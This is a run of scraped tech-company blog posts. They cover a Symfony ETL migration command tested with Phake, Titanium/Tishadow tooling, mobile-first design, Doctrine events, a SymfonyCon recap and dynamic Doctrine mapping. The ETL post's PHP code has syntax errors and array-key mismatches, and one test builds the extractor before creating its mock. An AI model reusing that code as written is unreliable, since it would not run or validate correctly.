        protected function configure()
        {
                $this->setName('migration:article')
        }

        protected function execute(InputInterface $input, OutputInterface $output)
        {
                $container = $this->getContainer();

                $extractor = $container->get('extractor.article');
                $transformer = $container->get('transformer.article');
                $loader = $container->get('loader.article');

                $extractor->extract();

                while ($article = $extractor->nextRow()) {
                        try {
                                $transformer->transform($article);
                                $loader->load($article);
                                $this->output->writeln('<info>[Success]  Article #'.$article->getLegacyId().' migrated</info>');
                        } catch (\Exception $e) {
                                $this->output->writeln('<error>[Failure] '.$e->getMessage().'</error>');
                        }
                }
        }
}


Extractor in TDD
Let’s write the extractor TDD style using Phake.
At first I have to make sure I execute the right query. I write a test for
it.
class ArticleExtractorTest extends \PHPUnit_Framework_TestCase
{
        private $extractor;
        private $connection;
        private $statement;

        public function setUp()
        {
                $this->extractor = new ArticleExtractor($this->connection);
                $this->connection = Phake::mock('Doctrine\DBAL\Connection');
                $this->statement = Phake::mock('Doctrine\DBAL\Driver\PDOStatement');
                Phake::when($this->connection)->executeQuery(Phake::anyParameters())->thenReturn($this->statement);
        }

        /**
         * Test if the right queries happen using some regex
         */
        public function testQueries()
        {
                $this->extractor->extract();

                $regexArray[] = '#SELECT.*FROM articles#is'; //I do a select in the right table
                $regexArray[] = '#AS author_legacy_id#is'; //I get the author legacy id
                $regexArray[] = '#AS content#is'; //I get the content
                // I could define more regex if I use a more complex query

                Phake::verify($this->connection, Phake::times(1))->executeQuery(Phake::capture($query));
                //I have tested that I did only one query and captured it

                foreach($regexArray as $regex) {
                        $this->assertRegExp($regex, $query);
                }
        }
}
With this test as starter, I can begin writing the actual functionnal
code.
class ArticleExtractor
{
        private $connection;
        private $statement;

        public function __construct(\Doctrine\DBAL\Connection $connection)
        {
                $this->connection = $connection;
        }

        public function extract()
        {
                $this->statement = $this->connection->executeQuery($this->getQuery());
        }

        private function getQuery()
        {
                return 'SELECT article_content AS content, author_id AS author_legacy_id, id AS legacy_id FROM articles';
        }
}
I now add the following tests about the expected result:
class ArticleExtractorTest extends \PHPUnit_Framework_TestCase
{
        // [...]

        /**
         * Test if the paramerter bag is correctly set when some data are extracted using a dataprovider
         * @dataProvider providerDummyStatementFetch
         */
        public function testResult($data)
        {
                Phake::when($this->statement)->fetch()->thenReturn($data);
                $this->extractor->extract();

                $result = $this->extractor->nextRow();
                $this->assertTrue($result instanceof Article);
                $this->assertEquals($data['content'], $result->getContent());
                $this->assertEquals($data['author_legacy_id'], $result->getAuthorLegacyId());
        }

        /**
         * Data provider
         */
        public function providerDummyStatementFetch()
        {
                return array(
                        array('legacy_id' => 1, 'author_legacy_id' => 1, 'content' => 'should be ok'),
                );
        }
}
I add the nextRow() method to my Extractor:
class ArticleExtractor
{
        // [...]

        public function nextRow()
        {
                if ($data = $this->statement->fetch()) {
                        $result = new Article();
                        $result->hydrate($data)

                        return $result;
                }

                return null;
        }
}
And the associated parameter bag for the result:
class Article
{
        private $authorLegacyId;
        private $content;
        private $legacyId;

        //Write the getter and setter

        public function hydrate($data)
        {
                $this->setContent($data['content']);
                $this->setLegacyId($data['legacyId']);
                $this->setAuthorLegacyId($data['authorLegacyId']));
        }
}
Thats good but what should happen if the fetched data are incorrect? I add 2
test cases to my data provider. One with an empty content and an other with a
negtiv id. I expect an error.
class ArticleExtractorTest extends \PHPUnit_Framework_TestCase
{
        // [...]

        /**
         * Test if the paramerter bag is correctly set when some data are extracted using a dataprovider
         * @dataProvider providerDummyStatementFetch
         */
        public function testResult($data)
        {
                Phake::when($this->statement)->fetch()->thenReturn($data);
                $this->extractor->extract();

                try {
                        $result = $this->extractor->nextRow();
                        $this->assertTrue($result instanceof Article);
                        $this->assertEquals($data['content'], $result->getContent());
                        $this->assertEquals($data['author_legacy_id'], $result->getAuthorLegacyId());
                } catch (\Exception $e) {
                        if ($data['legacy_id'] == -1) {
                                $this->assertEquals($e->getMessage(), 'Invalid legacy id')
                        }
                        if ($data['author_legacy_id'] == -1) {
                                $this->assertEquals($e->getMessage(), 'Invalid author legacy id')
                        }
                        if ($data['content'] == '') {
                                $this->assertEquals($e->getMessage(), 'Invalid content')
                        }
                }
        }

        /**
         * Data provider
         */
        public function providerDummyStatementFetch()
        {
                return array(
                        array('legacy_id' => 1,  'author_legacy_id' => 1,  'content' => 'should be ok'),
                        array('legacy_id' => -1, 'author_legacy_id' => 3,  'content' => 'negativ id error'),
                        array('legacy_id' => 1,  'author_legacy_id' => -1, 'content' => 'negativ author id error'),
                        array('legacy_id' => 1,  'author_legacy_id' => 3,  'content' => ''),
                );
        }
}
The parameter bag should check the validity of the data, I edit its
hydrate method:
class Article
{
        // [...]

        public function hydrate($data)
        {
                if (!isset($data['content']) OR empty($data['content'])) {
                        throw new \InvalidArgumentException('Invalid content');
                }
                if (!isset($data['authorLegacyId']) OR $data['authorLegacyId'] < 1) {
                        throw new \InvalidArgumentException('Invalid author legacy id');
                }
                if (!isset($data['legacyId']) OR $data['legacyId'] < 1) {
                        throw new \InvalidArgumentException('Invalid legacy id');
                }

                $this->setContent($data['content']);
                $this->setLegacyId($data['legacyId']);
                $this->setAuthorLegacyId($data['authorLegacyId']));
        }
}
And that’s all. I have an Extractor, a parameter bag and tests for it.
All I have to do now is to define this class as a service. There are multiple
ways to do it, just follow the book. Don’t forget to add a connection to the
legacy database as parameter.


Transformer and Loader
The process for the transformer and the loader is exactly the same. Here is
the code, you can write some tests using the same method as for the extractor.
This time when you define the services use a connection to the new database
as parameter:
class ArticleTransformer
{
        private $connection;

        public function __construct(\Doctrine\DBAL\Connection $connection)
        {
                $this->connection = $connection;
        }

        public function transform($article) {
                $article->setAuthorId($this->defineAuthorId($article->getAuthorLegacyId));
        }

        private function defineAuthorId($legacyId)
        {
                $query = 'SELECT id FROM user WHERE legacy_id = :legacyId';
                $queryData = array('legacyId' => $legacyId);
                $id = $this->connection->fetchColumn($query, $queryData, 0);

                return $id;
        }
}
class ArticleLoader
{
        private $connection;

        public function __construct(\Doctrine\DBAL\Connection $connection)
        {
                $this->connection = $connection;
        }

        public function load($article)
        {
                if (!$article->isValid()) {
                        throw new \InvalidArgumentException('Wrong format');
                }

                try {
                        $this->connection->transactional(function ($connection) use ($article) {

                                $queryData = $this->getQueryData($article);
                                $id = $connection->fetchColumn($this->getUpdateQuery(), $queryData, 0);

                                //if couldn't update then insert
                                if (0 >= $id) {
                                        $connection->fetchColumn($this->getInsertQuery(), $queryData, 0);
                                }
                        });
                } catch (\Exception $e) {
                        throw new \InvalidArgumentException('Fail migrating article #'.$article>getLegacyId().""\n"".'Connection error message : '.$e->getMessage());
                }
        }

        private function getQueryData($article)
        {
                return array(
                        'legacy_id' => $article->getLegacyId(),
                        'authorId' => $article->getAuthorId(),
                        'content' => $article->getContent(),
                );
        }

        private function getUpdateQuery()
        {
                return 'UPDATE article SET author = :authorId, content = :content WHERE legacy_id = :legacyId RETURNING id';
        }

        private function getInsertQuery()
        {
                return 'INSERT INTO article (id, author, content, legacy_id) VALUES ((nextval('article_id_seq'), :authorId, :content, :legacyId) RETURNING id)';
        }
}
I also had to update the parameter bag by adding an authorId field and
an isValid() method:
class Article
{
        private $authorLegacyId;
        private $authorId;
        private $content;
        private $legacyId;

        //Write the getter and setter

        public function hydrate($data)
        {
                if (!isset($data['content']) OR empty($data['content'])) {
                        throw new \InvalidArgumentException('Invalid content');
                }
                if (!isset($data['authorLegacyId']) OR $data['authorLegacyId'] < 1) {
                        throw new \InvalidArgumentException('Invalid author legacy id');
                }
                if (!isset($data['legacyId']) OR $data['legacyId'] < 1) {
                        throw new \InvalidArgumentException('Invalid legacy id');
                }

                $this->setContent($data['content']);
                $this->setLegacyId($data['legacyId']);
                $this->setAuthorLegacyId($data['authorLegacyId']));
        }

        public function isValid()
        {
                return  ! empty($this->content) AND $this->authorId > 0;
        }
}


Writing test when using a transactionnal
One problem you may have when trying to write tests for the loader
is that it uses a transactionnal, which encapsulates the queries.
Here is a way around. Let’s assume I have already phaked a connection
in $this->connection and have a loader ($this->loader):
/**
 * @param HabitationLegalEntityResult $data
 * @dataProvider providerDummyTransformerResult
 */
public function testQueries(HabitationLegalEntityResult $data)
{
        //Update everytime
        Phake::when($this->connection)->fetchColumn((Phake::anyParameters()), (Phake::anyParameters()), 0)->thenReturn(1);

        $this->loader->load($data, false);
        Phake::verify($this->connection, Phake::times(1))->transactional(Phake::capture($trans));
        call_user_func($trans, $this->connection);

        Phake::verify($this->connection, Phake::times(1))->fetchColumn(
                Phake::capture($query)->when($this->matchesRegularExpression('#^UPDATE#is')),
                (Phake::capture($queryData)),
                0
        );

        //I can do test with the $query and the $queryData of the Update Query

        //Has to do insert because Phake update will return -1 then insert will return 1
        Phake::when($this->connection)->fetchColumn((Phake::anyParameters()), (Phake::anyParameters()), 0)
                ->thenReturn(-1)->thenReturn(1);

        $this->loader->load($data, false);
        Phake::verify($this->connection, Phake::times(2))->transactional(Phake::capture($trans)); // second time transactional is called in the test
        call_user_func($trans, $this->connection);

        Phake::verify($this->connection, Phake::times(1))->fetchColumn(
                Phake::capture($query)->when($this->matchesRegularExpression('#^INSERT INTO#is')),
                (Phake::capture($queryData)),
                0
        );
        //I can do test with the $query and the $queryData of the Insert Query
}


Conclusion
You now know the basic of implementing ETL services command. As you have seen
the layout for it is very unspecific. This allows you to write abstract class
to factor the code if you plan to use multiple ETL command or simply to start
coding an almost functionnal command even if you are still not sure of how
to get or load the data.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jean-Matthieu Gallard
  			
  				  			
  		
    
			

									"
"
										<!--
#content .storycontent h2,
#content .storycontent h3 {
	margin: 2em 0 1em;
	line-height: normal;
}
#content .storycontent ol li {
	list-style-type: decimal;
}
#content div.article .illustration {
	margin: 0 auto;
	display: block;
}
#content div.article p {
	margin-bottom: 1em;
	line-height: 1.4em;
}
#content div.article pre {
	margin-bottom: 1.4em;
}
#content div.article pre.error {
	color: #f00;
}
#content div.article pre .comment {
	color: #999;
}
.gimme-more {
	max-height: 200px;
	overflow: hidden;
	transition:max-height 1.2s;
}
.gimme-more:hover {
	max-height: 900px;
}
.gimme-more:before {
	content: '↓ hover for more ↓';
	display: block;
        padding-bottom: 2px;
        border-bottom: 1px dashed #ccc;
        margin-bottom: 10px;
	text-align: center;
        color: #aaa;
}
-->
To reduce the amount of time lost during Titanium deployment process, I am going to present you a set of tools that will help you to accelerate your developments:

Tishadow
Alloy
Coffescript/Jade

Finally I will show you how everything can work together
Titanium
Titanium is a framework to build mobile applications in javascript. It’s a great tool allowing to work with ONE WEB language (javascript) on a SINGLE codebase. The titanium motto is “We handle device and OS compatibility. You build rich native apps”.
However if you want to test your UI on many devices, platforms, versions, the process is pretty long because you need to build the entire application, package it and install it on every device.
Fortunately for us, there are great tools out there to accelerate development and testing of your app.
A classic Titanium workflow contains the following steps:

Install nodeJS
Install titanium
Login/Setup titanium
Install titanium SDK
Install android SDK
Install Xcode
Start a fresh new app
Build the app for both platform
Test the UI on different devices

Repeat step 8 & 9 until your application is sexy enough. This is approximatively 1 minute per platform and per device to push the newly built app.
At the end of the day and if you push new code to test every 10 min on 2 devices (iphone/android), you just have spent 96min looking at your beloved terminal.
Moreover, if you don’t use a Mac to develop, you will have to transfer and launch the build on an other workstation :O.
We absolutely need to reduce the time between written code and eyes on the result, that’s where Tishadow comes.
Tishadow
Tishadow is a toolset allowing us to push our code via websockets to a client application which interpretes it on the run.
/!\ Tishadow is only meant to ease development and not for production /!\
By using Tishadow, the titanium SDK is not mandatory anymore.
You just have to build and install Tishadow like an usual titanium app.
The workflow is then reduced to this:

Install nodeJS
Install tishadow
Run the server : tishadow server
Install tishadow application on Iphone/Android
Run the client application on every device and connect to the server
Start a fresh new app
Deploy the application : tishadow run

You can then watch the result on every connected device, modify something, run tishadow run and wait 5 seconds 
Tishadow also includes a test engine that you can access by typing the tishadow spec command.
This command will run all the tests directly on every connected devices, saving some precious time once again.
Alloy
Alloy is an MVC framework on top of titanium which allows you to split your code logic into :

controllers (still in javascript)
views (in xml)
styles (in tss which is some strange javascript object in one file)

The entire directory structure is placed in app, and built back into titanium (in Resources) using alloy compile.
Coffeescript / Jade
For those out there who love coffeescript, and I know there are many, we can push the fun on step deeper and compile coffeescript into javascript just before alloy compilation.
This job can be done with a simple task in a configuration file.
I’m in the javascript world for some time now, playing with nodejs, backbone, angularjs and I fell in love not only with javascript and coffeescript but with the jade template engine too.
Jade is a language which will compile into html and by extension xml. You only need to declare the opening of your tag and indent the content right after it.
I have developed an alloy task to pre-compile coffeescript and jade into js/xml/tss, available on github => vbrajon/alloy-preformatter
Everything together
The goal of the entire article is to get an application and to be able to work fast!
I believe we are able to develop great applications faster when:

we write well designed code (structured), alloy is here for that
we write less code, thanks to coffeescript and jade.
we are able to see the result in live, tishadow run FTW
we test our code, with Tishadow again and any javascript test framework for your unit tests.

Don’t forget to keep it stupid simple – KISS.
A simple app looks like this: vbrajon/alloy-skeleton
controllers/index.coffee
----------
$.replace.text = 'Hello Titanium/Alloy World!'
$.window.open()

styles/index.tss.coffee
----------
tss =
Label:
color: ""#656565""
"".container"":
backgroundColor: ""#cecece""

view/index.jade
----------
Alloy
Window#window.container
Label#replace Hey, replace me dude!

You can get it running with:
git clone https://github.com/vbrajon/alloy-skeleton.git
cd alloy-skeleton
alloy compile
tishadow run

I encourage you to have a look at the generated files in Resources/alloy/controllers/index.js and the bundle sent by tishadow at build/tishadow/dist/#NAME#.zip

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				valentinb
  			
  				  			
  		
    
			

									"
"
										<!--
#content .storycontent h2,
#content .storycontent h3 {
	margin: 2em 0 1em;
	line-height: normal;
}
#content .storycontent ol li {
	list-style-type: decimal;
}
#content div.article .illustration {
	margin: 0 auto;
	display: block;
}
#content div.article p {
	margin-bottom: 1em;
	line-height: 1.4em;
}
#content div.article pre {
	margin-bottom: 1.4em;
}
#content div.article pre.error {
	color: #f00;
}
#content div.article pre .comment {
	color: #999;
}
.gimme-more {
	max-height: 200px;
	overflow: hidden;
	transition:max-height 1.2s;
}
.gimme-more:hover {
	max-height: 900px;
}
.gimme-more:before {
	content: '↓ hover for more ↓';
	display: block;
        padding-bottom: 2px;
        border-bottom: 1px dashed #ccc;
        margin-bottom: 10px;
	text-align: center;
        color: #aaa;
}
-->
A short note on a situation that I fear is becoming more and more common:
You’ve just been presented a wonderful website by an enthusiastic client, soooo proud of the time spent with a designer to validate the templates for all pages of the site, when the following is thrown in as a conclusion: “Oh and make it responsive, you know”.
We know, but they don’t. Responsive isn’t magic, you don’t make a website responsive by snapping fingers or switching on some buttons.
I guess the appropriate reply to that would be “Ok, how do you picture the site on a mobile device?” and see the look on your client’s face when they understand they have to go through the same design/validation loops again.
As my new rule of thumb (the former was “Think Google”), I say websites should first be designed with mobile in mind, and then extended to desktop versions.
Designing “mobile first” has many benefits, such as:

core features are better identified and simplified
the need for small, visual elements reduces the amount of confusing noise
the site can still be used on a dekstop computer, requiring minimal adjustments
small assets and CSS3 are privileged

Remember it’s easier to extend than it is to restrict, and this makes the approach a lot more “Agile friendly“, prioritising on what’s important.
Next step could well be to join the “NoPSD” movement. Since CSS3 is admirably suited for mobile design, we could hand the design over to the front-end developer alone… provided that the guy’s creativity is not limited. But that’s another story.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cyrille Jouineau
  			
  				Cyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  			
  		
    
			

									"
"
										
Here is an introduction to events in Doctrine and the changes brought by Doctrine 2.4. You will find all the code in this article on the following github repository.

Events in doctrine
Doctrine launches many events during the lifecycle of an entity.
The most commonly used are:

prePersist: this event is launched before persisting an entity
postPersist: this event is launched after persisting an entity
preUpdate: this event is launched before updating an entity
postUpdate: this event is launched after updating an entity
preRemove: this event is launched before deleting an entity
postRemove: this event is launched after deleting an entity

You can find a list of all doctrine events here:
http://docs.doctrine-project.org/en/latest/reference/events.html#lifecycle-events


In a doctrine entity
To use events in an entity you have to specify Lifecycle Callbacks with the help of annotations. We will take the example of an ant class:
/**
* Ant
*
* @ORM\Table()
* @ORM\HasLifecycleCallbacks
*/
class Ant
{
To attach a listener to a Doctrine Event, you can add the @ORMPrePersist to the function in your entity class like this:
/**
* @ORM\PrePersist
*/
public function setCreatedAtAndUpdatedAtPrePersist()
{
    $now = new \Datetime();

    $this->createdAt = $now;
    $this->updatedAt = $now;
}
The changes in Doctrine 2.4 make it possible to access an $event variable of type LifecycleEventArgs or PreUpdateEventArgs. With it you have access to the EntityManager and the UnitOfWork.
class Ant {
...
    /**
    * @ORM\PostUpdate
    */
    public function postUpdate(LifecycleEventArgs $event)
    {
        $entity = $event->getEntity();
        $em = $event->getEntityManager();

        ...
    }

    /**
    *
    * @ORM\PreUpdate
    */
    public function casteRules(PreUpdateEventArgs $event)
    {
        $entity = $event->getEntity();
        $em = $event->getEntityManager();

        if ($event->hasChangedField('caste') == self::CASTE_QUEEN) {
           $this->caste = $event->getOldValue('caste');
        }
    }
}
Ok it’s nice and all but keep in mind that you absolutely want to separate the logic from your entity to have an easily readable code 😉 That is why there are doctrine listeners.


Doctrine Listeners
In this section I will show you how to use listeners in Doctrine 2.4.
Creating a listener is very easy. First, annotate an entity with:
@ORM\EntityListeners({""UserListener""})
You can specify multiple listeners like this:
@ORM\EntityListeners({""UserListener"", ""UserListener2”})
But do not forget that if your listener is in another directory you must specify its namespace
@ORM\EntityListeners({""kosssi/UserBundle/Listener/UserListener""})
Secondly, create your own listener class in which you will be able to use all event functions like postPersist, preUpdate, postUpdate, etc. Here is a quick example of what your prePersist function could look like:
public function prePersist(Snake $snake, LifecycleEventArgs $event)
{
   $now = new \Datetime();

   $snake->setCreatedAt($now);
   $snake->setUpdatedAt($now);
}
You should immediately see a problem: What if you want to access other services from the listener? Since it is Doctrine that instantiates your listener, you cannot add parameters to the constructor.
This is where the ResolverListener comes in. You can create only one ResolverListener by project. In this class you will need to do the mapping between the listener name and the listener service that you have previously created in your services.yml with any parameters you want.
class ListenerResolver extends DefaultEntityListenerResolver
{
    public function __construct($container)
    {
           $this->container = $container;
    }

    public function resolve($className)
    {
        $id = null;
        if ($className === 'kosssi\ExampleDoctrineEventsBundle\Listener\SnakeSizeListener') {
            $id = 'kosssi_listener_snake_size';
        }

        if (is_null($id)) {
            return new $className();
        } else {
            return $this->container->get($id);
        }
    }
}
It’s easy to configure the listener resolver in config.yml with DoctrineBundle:
doctrine:
    orm:
        entity_listener_resolver: user_listener_resolver


In conclusion
So you see it is quite simple to create events in Doctrine. Events programming is really exciting since it allows you to interact with objects as they change and go through their lifecycles.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Simon Constans
  			
  				Simon Constans - Web developper for Theodo. I have been working with Symfony2 since its initial release and I keep searching for new development and design features. In short: I love Symfony2 and CSS3.  			
  		
    
			

									"
"
										Après le Symfony Live de Berlin 2012, où quatorze Theodoers avaient fièrement porté nos couleurs dans le temple de la communauté Symfony pendant les trois jours de l’événement, ce sont cette année quarante-deux (42 !) d’entre nous qui avons déferlé sur Varsovie sans se poser de questions sur le sens de la vie, l’univers et tout le reste.
 

Pendant trois jours, ce sont les tous meilleurs spécialistes de Symfony qui se sont réunis, ont pu échanger et assister aux conférences sur les innovations techniques, méthodologiques et commerciales portées par l’écosystème Symfony. Par l’odeur des gaufres fraîches alléchés, les portant jusqu’au stand Theodo, des camarades développeurs venus de toute l’Europe et même d’ailleurs sont venus à notre rencontre. Ils y ont découvert non seulement l’expertise et le dynamisme de Theodo, mais également l’ambiance de folie qui règne chez nous, à coup de combats de sabres laser.

Après deux jours de conférences, la soirée a réuni tous les Theodoers autour des cocktails d’exception du Syreny Spiew pour une fête poursuivie jusqu’au petit matin. Le lendemain, dès l’aube, à l’heure où blanchit la campagne, les plus courageux s’en sont allés participer au Hackathon géant tandis que les autres s’aventuraient, couleurs Theodo sur la tête ou les épaules, à la découverte de la ville-phénix, parée pour l’occasion de ses plus belles illuminations.

 
Bilan des quatre jours : 16 conférences, 347 contacts, 278 sabres laser distribués, 1367 gaufres mangées, 687 cocktails, 126 litres de bière, 8 bouteilles de vodka, 1 de champagne et 1 tshirt perdu.

Theodo donne rendez-vous à tous les Symfonistes l’année prochaine à Madrid !


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										A year ago, 14 brave Theodoers were in Berlin for the Symfony Live 2012. This time, 42(!) of us joined the very best of the Symfony Community at the SymfonyCon 2013 in Warsaw during which we didn’t have any time to wonder about the meaning of life, the universe and everything.


For three days, the very best specialists of Symfony gathered, discussed and attended conferences on technical, process-related and business innovations in the Symfony ecosystem. Many developers and fellows Symfonists from all over Europe – and even further – enjoyed their stop at the Theodo stand, drawn by the delicious smell of hot waffles. They had a chance to get acquainted with the expertise and dynamism Theodo fosters and the amazing atmosphere in our team of Jedis.
 

On the second evening, all of us Theododers found themselves sipping exceptional cocktails at the Syreny Wpiew and partying all night long. Early the next day, the bravest went for a Hackathon session along with other Symfony specialists. Meanwhile, the others, Theodo hats on the head and hoodies on the shoulders, ventured into town. The Phoenix City had dressed up most elegantly for the occasion.

 
The assessment after 4 days : 16 conferences, 347 contacts, 278 light sabers given away, 1367 waffles, 687 cocktails, 126 litres of beer, 8 bottles of vodka, 1 of champagne et 1 lost tshirt.

Theodo will see you all Symfonists next year in Madrid !


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										        Dynamic mapping in Doctrine and Symfony: How to extend entities
    

When developing with Symfony2, you may one day want to create an entity that will be used by many other entities in your application, using the exact same relation everytime. Let’s say you create an UploadedDocument entity and you know from the start that you will have to manage uploads in different contexts in the same application (attachments to a blog article, attachments to a user message, etc.). Sure you could manage these contexts manually and copy/paste your ORM definitions everywhere. But that would be wrong…  You should consider ORM mapping information as your code: ""DRY"" and maintainable. What if you have five, ten, fifteen different contexts in your huge application? What if you are ten different developers on this project? Each with their own way to define the mapping (forgetting here or there to define part of the mapping, making it invalid).
Convinced? Let’s dive into this upload example to explain the basic idea…

First a single context example

The basic UploadedDocument entity
Here is a very very basic entity we will consider as our UploadedDocument entity.

Note
As this article is not focused on the upload process you will not find details on how to manage cleanly a resource upload (for this, refer to the corresponding official documentation resource):


// src/Acme/DemoBundle/Entity/UploadedDocument.php
class UploadedDocument
{
    /**
     * @var integer
     */
    protected $id;

    /**
     * @var string
     */
    protected $name;

    /**
     * @var string
     */
    protected $path;

    //Add corresponding getters and setters
}
                    
Nothing fancy as you can see, nonetheless do not forget the corresponding basic mapping (assuming here you use XML):

// src/Acme/DemoBundle/Resources/config/doctrine/UploadedDocument.orm.xml
<?xml version=""1.0"" encoding=""utf-8""?>

<doctrine-mapping
    xmlns=""http://doctrine-project.org/schemas/orm/doctrine-mapping""
    xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
    xsi:schemaLocation=""http://doctrine-project.org/schemas/orm/doctrine-mapping
                        http://doctrine-project.org/schemas/orm/doctrine-mapping.xsd""
>
    <entity name=""Acme\DemoBundle\Entity\UploadedDocument""
            table=""uploaded_document""
    >

        <id name=""id"" type=""integer"" column=""id"">
            <generator strategy=""AUTO""/>
        </id>

        <field name=""name"" type=""string"" column=""name"" length=""150""/>

        <field name=""path"" type=""string"" column=""path"" length=""255""/>
    </entity>
</doctrine-mapping>
                    


The BlogArticle entity
You want to attach documents to a blog article so let’s create the basic BlogArticle entity:

// src/Acme/DemoBundle/Entity/BlogArticle.php
class BlogArticle
{
    /**
     * @var integer
     */
    protected $id;

    /**
     * @var string
     */
    protected $title;

    /**
     * @var string
     */
    protected $content;

    //Add corresponding getters and setters
}
                    
And the corresponding mapping:

// src/Acme/DemoBundle/Resources/config/doctrine/BlogArticle.orm.xml
<?xml version=""1.0"" encoding=""utf-8""?>

<doctrine-mapping
    xmlns=""http://doctrine-project.org/schemas/orm/doctrine-mapping""
    xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
    xsi:schemaLocation=""http://doctrine-project.org/schemas/orm/doctrine-mapping
                        http://doctrine-project.org/schemas/orm/doctrine-mapping.xsd""
>
    <entity name=""Acme\DemoBundle\Entity\BlogArticle""
            table=""blog_article""
    >

        <id name=""id"" type=""integer"" column=""id"">
            <generator strategy=""AUTO""/>
        </id>

        <field name=""title"" type=""string"" column=""title"" length=""150"" />

        <field name=""content"" type=""text"" column=""content"" />
    </entity>
</doctrine-mapping>
                    
As you can see nothing actually relates the BlogArticle entity to the UploadedDocument entity yet. As explained above in this article you could, at this point, decide to write manually your mapping information in this BlogArticle.orm.xml file. The point of this article is to present you another way…


The Dynamic Mapping Event Subscriber
We can also define relations using an EventListener or (as shown here) an EventSubscriber:

// src/Acme/DemoBundle/EventListener/DynamicRelationSubscriber.php
class DynamicRelationSubscriber implements EventSubscriber
{
    /**
     * {@inheritDoc}
     */
    public function getSubscribedEvents()
    {
        return array(
            Events::loadClassMetadata,
        );
    }

    /**
     * @param LoadClassMetadataEventArgs $eventArgs
     */
    public function loadClassMetadata(LoadClassMetadataEventArgs $eventArgs)
    {
        // the $metadata is the whole mapping info for this class
        $metadata = $eventArgs->getClassMetadata();

        if ($metadata->getName() != 'Acme\DemoBundle\Entity\BlogArticle') {
            return;
        }

        $namingStrategy = $eventArgs
            ->getEntityManager()
            ->getConfiguration()
            ->getNamingStrategy()
        ;

        $metadata->mapManyToMany(array(
            'targetEntity'  => UploadedDocument::CLASS,
            'fieldName'     => 'uploadedDocuments',
            'cascade'       => array('persist'),
            'joinTable'     => array(
                'name'        => strtolower($namingStrategy->classToTableName($metadata->getName())) . '_document',
                'joinColumns' => array(
                    array(
                        'name'                  => $namingStrategy->joinKeyColumnName($metadata->getName()),
                        'referencedColumnName'  => $namingStrategy->referenceColumnName(),
                        'onDelete'  => 'CASCADE',
                        'onUpdate'  => 'CASCADE',
                    ),
                ),
                'inverseJoinColumns'    => array(
                    array(
                        'name'                  => 'document_id',
                        'referencedColumnName'  => $namingStrategy->referenceColumnName(),
                        'onDelete'  => 'CASCADE',
                        'onUpdate'  => 'CASCADE',
                    ),
                )
            )
        ));
    }
}
                    

Note
The ClassName::CLASS notation appeared in PHP 5.5. For previous PHP versions you could also create a constant in the subscriber with the full qualified namespace to the UploadedDocument Entity (AcmeDemoBundleEntityUploadedDocument) and use this constant instead.

Since a relation has been added to the BlogArticle, Symfony will expect that the corresponding setters and getters exist. This is a limitation of the dynamic mapping, you will still have to define them manually:

// src/Acme/DemoBundle/Entity/BlogArticle.php
class BlogArticle
{
    protected $id;

    protected $title;

    protected $content;

    /**
     * @var ArrayCollection
     */
    protected $uploadedDocuments;

    // [...]

    public function addUploadedDocument(UploadedDocument $uploadedDocument)
    {
        $this->uploadedDocuments->add($uploadedDocument);

        return $this;
    }

    public function removeUploadedDocument(UploadedDocument $uploadedDocument)
    {
        $this->uploadedDocuments->removeElement($uploadedDocument);
    }

    public function getUploadedDocuments()
    {
        return $this->uploadedDocuments;
    }

    public function setUploadedDocuments(ArrayCollection $uploadedDocuments)
    {
        $this->uploadedDocuments = $uploadedDocuments;

        return $this;
    }
}
                    



Technical insight on how it’s actually working behind the scene

What is mapping and how you usually modify it

The Doctrine ORM Mapping is like a bridge connecting two shores:


Your entities, your object model on one side
Your database tables, your database model on the other side



It allows Doctrine to understand how information stored in your entities are actually persisted in your database, how the different database tables are related and reciprocally, how information stored in the database will be fetched and hydrated into your entities.
As I said, there are usually four ways of manipulating Doctrine ORM mapping: YamL, XML, PHP and Annotations. This one is a complement, compatible with all the other ones.


You already have met dynamic mapping
Most of the Symfony2 developers have used at least once Gedmo’s Doctrine extensions so I am quite sure you used dynamic mapping without even knowing it.
In fact Gedmo’s behaviour is based on this. What we usually call ORM mapping information are in fact metadata associated to the entity class. Gedmo plugs into the metadata you defined for an entity and extends them.


When is doctrine mapping generated?
These metadata are loaded by the DoctrineORMMappingClassMetadataFactory which is created by your EntityManager at instanciation time and which itself exposes a public method to load these, entity by entity (getClassMetadata($className)). In fact, most of the time you will end up with all the metadata loaded for all entities shortly after the EntityManager has been created.


How to dynamically modify it?
When the metadata of a class are loaded, the ClassMetadataFactory checks if something is listening on the Events::loadClassMetadata event, and if yes, triggers it with a LoadClassMetadataEventArgs object which gives access to the current class metadata.
You can thus easily create a listener or a subscriber mapped on this event and extend all (or a subset of) your entities by adding the metadata you want using the methods exposed in the Doctrine PHP mapping reference.
But let’s go back to our example and improve things a little bit.



Useful refactoring of common entity behaviour

Warning
This solution is only available since PHP 5.4.0 as Trait have been implemented from this version on.

Since the uploadedDocuments property and the corresponding getters and setters will be common to all the entities requiring a many-to-many relation with UploadedDocument, we could refactor this into a generic trait that we will use in the BlogArticle entity:

// src/Acme/DemoBundle/Entity/HasUploadedDocumentTrait
trait HasUploadedDocumentTrait
{
    /**
     * @var ArrayCollection
     */
    protected $uploadedDocuments;

    public function addUploadedDocument(UploadedDocument $uploadedDocument)
    {
        $this->uploadedDocuments->add($uploadedDocument);

        return $this;
    }

    public function removeUploadedDocument(UploadedDocument $uploadedDocument)
    {
        $this->uploadedDocuments->removeElement($uploadedDocument);
    }

    public function getUploadedDocuments()
    {
        return $this->uploadedDocuments;
    }

